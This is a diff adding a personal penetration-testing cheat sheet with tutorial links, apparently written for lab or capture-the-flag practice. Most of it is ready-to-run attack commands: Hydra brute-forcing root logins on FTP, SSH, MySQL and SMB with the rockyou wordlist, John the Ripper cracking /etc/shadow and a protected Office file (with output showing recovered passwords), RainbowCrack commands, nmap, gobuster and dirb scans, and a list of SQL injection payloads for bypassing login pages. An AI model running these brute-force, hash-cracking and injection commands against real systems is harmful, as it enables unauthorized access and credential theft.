@@ -1,0 +1,109 @@
+https://www.youtube.com/watch?v=U40tpgQsoZE&ab_channel=AnkitChauhan
+https://www.youtube.com/watch?v=ycZFk-GT5-I&list=PLrrgFyE6PtlaCixUxJPM0Y9Peye6iCewH&ab_channel=OffensiveHacks
+https://www.youtube.com/watch?v=wBTENzEuS7U&ab_channel=NetworkKings
+
+
+Netdiscover
+
+netdiscover -i eth0
+========================
+Hydra
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt ftp://127.0.0.1 -t 40 -V
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -t 40 -V
+hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://127.0.0.1 -t 40 -V
+hydra -l root -P /usr/share/wordlists/rockyou.txt smb://127.0.0.1 -t 40 -V
+
+SMB Login
+
+smbclient -L 192.168.0.198 -U root
+
+=====================================================================
+John the Ripper
+
+zip2john Secure.zip > sec.txt
+rar2john Secure.rar > sec.txt
+office2john.py test.docx > hash.txt
+
+john --format=zip pass.txt
+john pass.txt
+john /etc/shadow
+
+
+root@kali:~# john /etc/shadow
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
+toor             (root)
+toor             (include)
+2g 0:00:00:00 DONE 1/3 (2021-06-26 17:53) 28.57g/s 1557p/s 1571c/s 1571C/s I99999i99999..toor
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+root@kali:~# john hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
+Cost 1 (MS Office version) is 2013 for all loaded hashes
+Cost 2 (iteration count) is 100000 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 14 candidates buffered for the current salt, minimum 16 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Warning: Only 11 candidates buffered for the current salt, minimum 16 needed for performance.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+12345            (test.docx)
+1g 0:00:01:19 DONE 2/3 (2021-06-26 18:07) 0.01252g/s 150.8p/s 150.8c/s 150.8C/s 123456..secret
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+==================================================================================
+
+Quick Stego/Stegosuite
+
+============================================================================
+
+Rainbow Crack
+
+Rainbow Table - Table of hash,encoded by algorithms
+
+rtgen sha256 loweralpha 1 4 0 1000 1000 0
+
+rtsort <rainbow_table_name>
+
+rcrack sha256_loweralpha#1-4_0_1000x1000_0.rt -h 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
+
+========================================================================================================================
+
+https://www.stationx.net/nmap-cheat-sheet/
+https://www.poftut.com/how-to-scan-wordpress-sites-with-wpscan-tutorial-for-security-vulnerabilities/
+https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/
+https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/
+https://linuxconfig.org/password-cracking-with-john-the-ripper-on-linux
+https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/
+https://unit42.paloaltonetworks.com/using-wireshark-display-filter-expressions/
+
+netdiscover -i eth0 — This will help me to get the machines available on our network. [ eth0 may differ if VPN network I will be tun0 ]
+Once I get the IP’s I will run my Nmap on all those IP’s.
+nmap -p- 10.10.10.10 [ Any IP ]
+nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10
+
+
+gobuster -e -u http://10.10.10.10 -w wordlsit.txt
+
+dirb http://10.10.10.10 wordlist.txt
+
+6. If I find any login page I will try SQLi manually
+
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1—
